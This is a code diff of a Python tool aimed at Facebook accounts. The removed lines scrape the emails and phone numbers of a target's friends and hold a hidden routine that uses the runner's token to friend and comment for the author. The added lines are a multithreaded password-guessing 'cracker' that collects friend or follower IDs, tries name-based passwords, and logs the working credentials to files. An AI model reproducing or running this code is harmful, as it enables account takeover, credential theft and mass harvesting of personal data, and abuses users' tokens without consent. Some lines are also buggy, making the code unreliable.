+    print("══════════════════════════════════════════════")
+    raw_input(" Press enter to download file")
+    os.system("cp likes_post.txt /sdcard")
+    os.system("rm -rf likes_post.txt")
+    print(" File downloaded successfully")
+    time.sleep(1)
+    menu()
+def choice():
+	global token
+	os.system("clear")
 	try:
-		toket=open('login.txt','r').read()
+		token = open(".login.txt","r").read()
 	except IOError:
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		una = ('100052292505058')
-	        kom = ('Hai Bang Andre😆🖐️')
-	        reac = ('ANGRY')
-	        post = ('185535143199568')
-	        post2 = ('185535143199568')
-	        kom2 = ('Saatnya Ngehack Hahaha😂🤣')
-	        reac2 = ('LOVE')
-	        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
-	        requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
-	        requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
-	        requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
-	        requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
+		print("")
+		print("\t    \033[1;31mToken not found\033[0;97m")
 		time.sleep(1)
-		os.system('python2 jam.py')
-	os.system('clear')
-	print banner
-	print "[1] Extract Numeric IDs From Public ID."
-	print "[2] Extract Email's From Public ID."
-	print "[3] Extract Phone Number From Public ID."
-	print "[4] Extract Likes From Post ID."
-	print "[5] Extract Followers From ID."
-	print "[0] Back."
-	print('          ')
-	grab_menu()
-	
-#Grab_input
-def grab_menu():
-	grm = raw_input("\nChoose Option >> ")
-	if grm =="":
-		print " Wrong Input"
-		grab_menu()
-	elif grm =="1":
-		idfromfriend()
-	elif grm =="2":
-		emailfromfriend()
-	elif grm =="3":
-		numberfromfriend()
-	elif grm =="4":
-		idfrompost()
-	elif grm =="5":
-		idfromfollow()
-	elif grm =="0":
-		menu()
+		login_choice()
+	os.system("clear")
+	print(logo)
+	print("\t    \033[7m\033[1;32mMEDIUM CRACK MENU\033[0;97m")
+	print("══════════════════════════════════════════════")
+	print("[1] Crack public id")
+	print("[2] Crack followers")
+	print("[3] Crack file")
+	print("[0] Back")
+	print("══════════════════════════════════════════════")
+	choice_select()
+def choice_select():
+	select = raw_input("\033[1;33mChoose option: \033[0;97m")
+	id=[]
+	oks=[]
+	cps=[]
+	if select =="1":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")
+		print("══════════════════════════════════════════════")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+		pass3 = raw_input(" [3]Password: ")
+		pass4 = raw_input(" [4]Password: ")
+		idt = raw_input(" Input id: ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			print(" Cloning from : "+q["name"])
+		except KeyError:
+			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+			print("")
+			raw_input(" Press enter to back")
+			choice()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="2":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS CRACK FOLLOWERS\033[0;97m")
+		print("══════════════════════════════════════════════")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+		pass3 = raw_input(" [3]Password: ")
+		pass4 = raw_input(" [4]Password: ")
+		idt = raw_input(" Input id: ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			print(" Cloning from: "+q["name"])
+		except KeyError:
+			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+			print("══════════════════════════════════════════════")
+			raw_input(" Press enter to back")
+			choice()
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="3":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS FILE CRACK\033[0;97m")
+		print("══════════════════════════════════════════════")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+		pass3 = raw_input(" [3]Password: ")
+		pass4 = raw_input(" [4]Password: ")
+		filelist = raw_input(" Input file: ")
+		try:
+			for line in open(filelist , "r").readlines():
+			    id.append(line.strip())
+		except (KeyError,IOError):
+			print("")
+			print("\t    \033[1;31mRequested file not found\033[0;97m")
+			print("══════════════════════════════════════════════")
+			raw_input(" Press enter to back ")
+			choice()
+	elif select =="0":
+	    menu()
 	else:
-		print "[!] Wrong input"
-		grab_menu()
-		
-
-
-##### Extract IDs From Public Id #####
-def idfromfriend():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		('python2 jam.py')
-	try:
-		os.mkdir('/sdcard/ids')
-	except OSError:
-		pass
-	try:
-		os.system('clear')
-		print banner
-		idt = raw_input("[+] Input ID : ")
+		print("")
+		print("\t    \033[1;31mSelect valid option\033[0;97m")
+		print("")
+		choice_select()
+	print("Total IDs : "+str(len(id)))
+	print("The Process has started")
+	print("══════════════════════════════════════════════")
+	def main(arg):
+		user=arg
+		uid,name=user.split("|")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"[✓] Account Name : "+op["name"]
-		except KeyError:
-			print"[!] Friend Not Found"
-			raw_input("Press Enter To Back ")
-			grab()
-		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
-		z=json.loads(r.text)
-		jam('[✓] Getting Friends Numeric IDs...')
-		print"--------------------------------------"
-		bz = open('/sdcard/ids/jam_file.txt','w')
-		for a in z['friends']['data']:
-			idh.append(a['id'])
-			bz.write(a['id'] + ' | ' '\n')
-			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
-		bz.close()
-		print '\r[✓] The Process Has Been Completed.'
-		print"\r[✓] Total IDs Founded : "+str(len(idh))
-		done = raw_input("\r[?] Save File With Name : ")
-		print("\r[✓] The File Has Been Saved As save/"+done)
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except IOError:
-		print"[!] Error While Creating file"
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except (KeyboardInterrupt,EOFError):
-		print("[!]The Process Has Been Stopped")
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except KeyError:
-		print('[!] Error')
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except requests.exceptions.ConnectionError:
-		print"[✖] No Connection"
-		time.sleep(1)
-		grab()
+			pass1 = name.lower() + p1
+			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
+			q = json.loads(data)
+			if "loc" in q:
+				print("\033[1;92m[Sania-Ok] "+uid+" | "+pass1)
+				ok = open("/sdcard/ids/sdcard/ids/jam_ok.txt", "a")
+				ok.write(uid+" | "+pass1+"\n")
+				ok.close()
+				oks.append(uid+pass1)
+			else:
+				if "www.facebook.com" in q["error"]:
+					print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass1)
+					cp = open("/sdcard/ids/jam_cp.txt","a")
+					cp.write(uid+" | "+pass1+"\n")
+					cp.close()
+					cps.append(uid+pass1)
+				else:
+					pass2 = name.lower() + p2
+					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
+					q = json.loads(data)
+					if "loc" in q:
+						print("\033[1;92m[Sania-Ok] "+uid+" | "+pass2)
+						ok = open("/sdcard/ids/jam_ok.txt", "a")
+						ok.write(uid+" | "+pass2+"\n")
+						ok.close()
+						oks.append(uid+pass2)
+					else:
+						if "www.facebook.com" in q["error"]:
+							print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass2)
+							cp = open("/sdcard/ids/jam_cp.txt","a")
+							cp.write(uid+" | "+pass2+"\n")
+							cp.close()
+							cps.append(uid+pass2)
+						else:
+							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
+							q = json.loads(data)
+							if "loc" in q:
+								print("\033[1;92m[Sania-Ok] "+uid+" | "+pass3)
+								ok = open("/sdcard/ids/jam_ok.txt", "a")
+								ok.write(uid+" | "+pass3+"\n")
+								ok.close()
+								oks.append(uid+pass3)
+							else:
+								if "www.facebook.com" in q["error"]:
+									print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass3)
+									cp = open("/sdcard/ids/jam_cp.txt","a")
+									cp.write(uid+" | "+pass3+"\n")
+									cp.close()
+									cps.append(uid+pass3)
+								else:
+									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
+									q = json.loads(data)
+									if "loc" in q:
+										print("\033[1;92m[Sania-Ok] "+uid+" | "+pass4)
+										ok = open("/sdcard/ids/jam_ok.txt", "a")
+										ok.write(uid+" | "+pass4+"\n")
+										ok.close()
+										oks.append(uid+pass4)
+									else:
+										if "www.facebook.com" in q["error"]:
+											print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass4)
+											cp = open("/sdcard/ids/jam_cp.txt","a")
+											cp.write(uid+" | "+pass4+"\n")
+											cp.close()
+											cps.apppend(uid+pass4)
 
-##### Reactions POST ID EXTRACT#####
-def idfrompost():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		('python2 jam.py')
-	try:
-		os.mkdir('/sdcard/ids')
-	except OSError:
-		pass
-	try:
-		os.system('clear')
-		print banner
-		una = ('100052292505058')
-		una = raw_input("[+] Post ID : ")
-		try:
-			jok = requests.get("https://graph.facebook.com/me/friends?method=post&uids="+una+"&access_token="+toket)
-			op = json.loads(jok.text)
-		except KeyError:
-			print"[!] Friend Not Found"
-			raw_input("Press Enter To Back ")
-			grab()
-		r=requests.get("https://graph.facebook.com/"+una+"/reactions?limit=9999999&access_token="+toket)
-		z=json.loads(r.text)
-		jam('[✓] Getting Post Likes Extract IDs...')
-		print"--------------------------------------"
-		bz = open('/sdcard/ids/jam_post.txt','w')
-		for a in z['data']:
-			idh.append(a['id'])
-			bz.write(a['id'] + ' | ' '\n')
-			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
-		bz.close()
-		print '\r[✓] The Process Has Been Completed.'
-		print"\r[✓] Total IDs Founded : "+str(len(idh))
-		done = raw_input("\r[?] Save File With Name : ")
-		print("\r[✓] The File Has Been Saved As save/"+done)
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except IOError:
-		print"[!] Error While Creating file"
-		
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except (KeyboardInterrupt,EOFError):
-		print("[!]The Process Has Been Stopped")
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except KeyError:
-		print('[!] Error')
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except requests.exceptions.ConnectionError:
-		print"[✖] No Connection"
-		time.sleep(1)
-		grab()
-##### FOLLOW ID EXTRACT#####
-def idfromfollow():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		('python2 jam.py')
-	try:
-		os.mkdir('/sdcard/ids')
-	except OSError:
-		pass
-	try:
-		os.system('clear')
-		print banner
-		una = ('100052292505058')
-		idt = raw_input("[+] Public ID : ")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-		except KeyError:
-			print"[!] Friend Not Found"
-			raw_input("Press Enter To Back ")
-			grab()
-		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+toket+"&limit=999999")
-		z=json.loads(r.text)
-		jam('[✓] Getting Follow Extract IDs...')
-		print"--------------------------------------"
-		bz = open('/sdcard/ids/jam_follow.txt','w')
-		for a in z['data']:
-			idh.append(a['id'])
-			bz.write(a['id'] + ' | ' '\n')
-			print ("\r => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
-		bz.close()
-		print '\r[✓] The Process Has Been Completed.'
-		print"\r[✓] Total IDs Founded : "+str(len(idh))
-		done = raw_input("\r[?] Save File With Name : ")
-		print("\r[✓] The File Has Been Saved As save/"+done)
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except IOError:
-		print"[!] Error While Creating file"
-		
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except (KeyboardInterrupt,EOFError):
-		print("[!]The Process Has Been Stopped")
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except KeyError:
-		print('[!] Error')
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except requests.exceptions.ConnectionError:
-		print"[✖] No Connection"
-		time.sleep(1)
-		grab()
-##### EMAIL FROM Friend#####
-def emailfromfriend():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		os.system('python2 jam.py')
-	try:
-		os.mkdir('/sdcard/Email.txt')
-	except OSError:
-		pass
-	try:
-		os.system('clear')
-		print banner
-		idt = raw_input("[+] Input ID : ")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"[✓] Account Name : "+op["name"]
-		except KeyError:
-			print"[!] Account Not Found"
-			raw_input("\nPress Enter To Back ")
-			grab()
-		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
-		a = json.loads(r.text)
-		jam('[✓] Getting Emails From')
-		print 40*"\033[1;97m-"
-		bz = open('save/email.txt','w')
-		for i in a['data']:
-			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
-			z = json.loads(x.text)
-			try:
-				emfromfriend.append(z['email'])
-				bz.write(z['email'] + '\n')
-				print ("\r\033[1;97m[ \033[1;97m"+str(len(emfromfriend))+"\033[1;97m ]\033[1;97m  \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
-			except KeyError:
-				pass
-		bz.close()
-		print "----------------------------------"
-		print '\r[✓] Successfully Extracted Mails'
-		print"\r[✓] Total Mail Founded : "+str(len(emfromfriend))
-		done = raw_input("\r\033[1;97m[✓] \033[1;97mSave File With Name\033[1;97m :\033[1;97m ")
-		print("\r[✓] File Has Been Saved As : save/"+done)
-		raw_input("\nPress Enter  To Back ")
-		grab()
-	except IOError:
-		print"[!] Error While Creating file"
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except (KeyboardInterrupt,EOFError):
-		print("[!] Process Has Been Stopped")
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except KeyError:
-		print('[!] Error')
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except requests.exceptions.ConnectionError:
-		print"\033[1;97m[✖] No Connection"
-		time.sleep(1)
-		grab()
-		
-
-
-##### Number From Public Id #####
-def numberfromfriend():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		os.system('python2 jam.py')
-	try:
-		os.mkdir('/sdcard/Number.txt')
-	except OSError:
-		pass
-	try:
-		os.system('clear')
-		print banner
-		idt = raw_input("[+] Input ID : ")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"[✓] Account Name : "+op["name"]
-		except KeyError:
-			print"[!] Friend Not Found"
-			raw_input("\nPress Enter To Back ")
-			grab()
-		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
-		a = json.loads(r.text)
-		jam('[✓] Getting All Numbers')
-		print 40*"\033[1;97m-"
-		bz = open('save/number.txt','w')
-		for i in a['data']:
-			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
-			z = json.loads(x.text)
-			try:
-				nofromfriend.append(z['mobile_phone'])
-				bz.write(z['mobile_phone'] + '\n')
-				print ("\r\033[1;97m[ \033[1;97m"+str(len(nofromfriend))+"\033[1;97m ]\033[1;97m \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.001)
-			except KeyError:
-				pass
-		bz.close()
-		print "-----------------------------------"
-		print"\r[✓] Total Number Founded : "+str(len(nofromfriend))
-		done = raw_input("\r[?] Save File With Name: ")
-		print("\r[✓] File Has Been Saved As save/"+done)
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except IOError:
-		print"[!] Error While Creating file"
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except (KeyboardInterrupt,EOFError):
-		print("[!]The Process Has Been Stopped")
-		raw_input("\nPress Enter To Back")
-		grab()
-	except KeyError:
-		print('[!] Error')
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except requests.exceptions.ConnectionError:
-		print"\n[✖] No Connection"
-		time.sleep(1)
-		grab()
-
-##### MENU BOT #####
-#----------------------------------------#
-def bot():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"[!] Token not found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		os.system('python2 jam.py')
-	os.system('clear')
-	print banner
-	print "[1] Auto Delete Posts."
-	print "[2] Auto Accept Friend Requests."
-	print "[3] Auto Unfriend All."
-	print "[0] Back."
-	print ('         ')
-	bot_menu()
+																
+		except:
+			pass
 	
-def bot_menu():
-	bots = raw_input("\nChoose Option >> ")
-	if bots =="":
-		print "[!] Wrong Input"
-		bot_menu()
-	elif bots =="1":
-		deletepost()
-	elif bots =="2":
-		accept()
-	elif bots =="3":
-		unfriend()
-	elif bots =="0":
-		menu()
+	p = ThreadPool(30)
+	p.map(main,id)
+	print("══════════════════════════════════════════════")
+	print(" The process has completed")
+	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
+	print("══════════════════════════════════════════════")
+	raw_input(" Press enter to back")
+	choice()
+	
+def choice_jam():
+	global token
+	os.system("clear")
+	try:
+		token = open(".login.txt","r").read()
+	except IOError:
+		print("")
+		print("\t    \033[1;31mToken not found\033[0;97m")
+		time.sleep(1)
+		login_choice()
+	os.system("clear")
+	print(logo)
+	print("\t    \033[7m\033[1;32mFAST CRACK MENU\033[0;97m")
+	print("══════════════════════════════════════════════")
+	print("[1] Crack public id")
+	print("[2] Crack followers")
+	print("[3] Crack file")
+	print("[0] Back")
+	print("══════════════════════════════════════════════")
+	choice_select_jam()
+def choice_select_jam():
+	select = raw_input("\033[1;33mChoose option: \033[0;97m")
+	id=[]
+	oks=[]
+	cps=[]
+	if select =="1":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")
+		print("══════════════════════════════════════════════")
+		pass1 = raw_input(" [1]Password: ")
+		pass2 = raw_input(" [2]Password: ")
+		idt = raw_input(" Input id: ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			print(" Cloning from : "+q["name"])
+		except KeyError:
+			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+			print("")
+			raw_input(" Press enter to back")
+			choice_jam()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="2":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS CRACK FOLLOWERS\033[0;97m")
+		print("══════════════════════════════════════════════")
+		pass1 = raw_input(" [1]Password: ")
+		pass2 = raw_input(" [2]Password: ")
+		idt = raw_input(" Input id: ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			print(" Cloning from: "+q["name"])
+		except KeyError:
+			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+			print("══════════════════════════════════════════════")
+			raw_input(" Press enter to back")
+			choice_jam()
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="3":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS FILE CRACK\033[0;97m")
+		print("══════════════════════════════════════════════")
+		pass1 = raw_input(" [1]Password: ")
+		pass2 = raw_input(" [2]Password: ")
+		filelist = raw_input(" Input file: ")
+		try:
+			for line in open(filelist , "r").readlines():
+			    id.append(line.strip())
+		except (KeyError,IOError):
+			print("")
+			print("\t    \033[1;31mRequested file not found\033[0;97m")
+			print("══════════════════════════════════════════════")
+			raw_input(" Press enter to back ")
+			choice_jam()
+	elif select =="0":
+	    menu()
 	else:
-		print "[!] Wrong Input"
-		bot_menu()
-		
-
-
-##### Auto Delt Post #####
-def deletepost():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		lol = json.loads(nam.text)
-		name = lol['name']
-	except IOError:
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		time.sleep(0.1)
-		os.system('python2 jam.py')
-	os.system('clear')
-	print banner
-	print("[✓] Account Name : "+nama)
-	jam("[✓] The Process Has Been Started")
-	print (40*"-")
-	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
-	asus = json.loads(asu.text)
-	for p in asus['data']:
-		id = p['id']
-		piro = 0
-		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
-		ok = json.loads(url.text)
+		print("")
+		print("\t    \033[1;31mSelect valid option\033[0;97m")
+		print("")
+		choice_select_jam()
+	print("Total IDs : "+str(len(id)))
+	print("The Process has started")
+	print("══════════════════════════════════════════════")
+	def main(arg):
+		user=arg
+		uid,name=user.split("|")
 		try:
-			error = ok['error']['message']
-			print '\033[1;97m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;97m] \033[1;97m[!] Failed'
-		except TypeError:
-			print '\033[1;97m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;97m \033[1;97[✓] [Deleted]'
-			piro += 1
-		except requests.exceptions.ConnectionError:
-			print"\033[1;91m[!] Connection Error"
-			raw_input("\nPress Enter To Back ")
-			bot()
-	print (40*"-")
-	print"[✓] The Process Has Been Completed. "
-	raw_input("\nPress Enter To Back ")
-	bot()
+			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
+			q = json.loads(data)
+			if "loc" in q:
+				print("\033[1;92m[Sania-Ok] "+uid+" | "+pass1)
+				ok = open("/sdcard/ids/sdcard/ids/jam_ok.txt", "a")
+				ok.write(uid+" | "+pass1+"\n")
+				ok.close()
+				oks.append(uid+pass1)
+			else:
+				if "www.facebook.com" in q["error"]:
+					print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass1)
+					cp = open("/sdcard/ids/jam_cp.txt","a")
+					cp.write(uid+" | "+pass1+"\n")
+					cp.close()
+					cps.append(uid+pass1)
+				else:
+					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
+					q = json.loads(data)
+					if "loc" in q:
+						print("\033[1;92m[Sania-Ok] "+uid+" | "+pass2)
+						ok = open("/sdcard/ids/jam_ok.txt", "a")
+						ok.write(uid+" | "+pass2+"\n")
+						ok.close()
+						oks.append(uid+pass2)
+					else:
+						if "www.facebook.com" in q["error"]:
+							print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass2)
+							cp = open("/sdcard/ids/jam_cp.txt","a")
+							cp.write(uid+" | "+pass2+"\n")
+							cp.close()
+							cps.append(uid+pass2)
+
+																
+		except:
+			pass
 	
-##### ACCEPT FRIEND #####
-def accept():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		os.system('python2 jam.py')
-	os.system('clear')
-	print banner
-	limit = raw_input("[+] Enter Limit To Accept Requests : ")
-	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
-	teman = json.loads(r.text)
-	if '[]' in str(teman['data']):
-		print"No friend Request"
-		raw_input("Press Enter To Back ")
-		bot()
-	jam('[✓] The Process Has Been Start')
-	print (40*"-")
-	for i in teman['data']:
-		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
-		a = json.loads(gas.text)
-		if 'error' in str(a):
-			print "[!] [Failed] | "+i['from']['name']
-		else:
-			print "[!] [Accepted] |  "+i['from']['name']
-	print (40*"-")
-	print"[✓] The Process Has Been Completed."
-	raw_input("\nPress Enter To Back ")
-	bot()
-	
-##### UNFRIEND ####
-def unfriend():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		os.system('python2 jam.py')
-	os.system('clear')
-	print banner
-	jam('[✓] The Process Has Been Started.')
-	print "[✓] Press CTRL Z to Stop Process."
-	print (50*"-")
-	try:
-		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
-		cok = json.loads(pek.text)
-		for i in cok['data']:
-			name = i['name']
-			id = i['id']
-			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
-			print "[✓] [Unfriended] | "+name
-	except IndexError: pass
-	except KeyboardInterrupt:
-		print "[!]The Process Has Been Stopped"
-		raw_input("\n Press Enter To Back ")
-		bot()
-	print"[✓] The Process Has Been Completed."
-	raw_input("Press Enter To Back ")
-	bot()
+	p = ThreadPool(30)
+	p.map(main,id)
+	print("══════════════════════════════════════════════")
+	print(" The process has completed")
+	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
+	print("══════════════════════════════════════════════")
+	raw_input(" Press enter to back")
+	choice_jam()
 	
 if __name__ == '__main__':
-	menu()
+	tlogin()
+
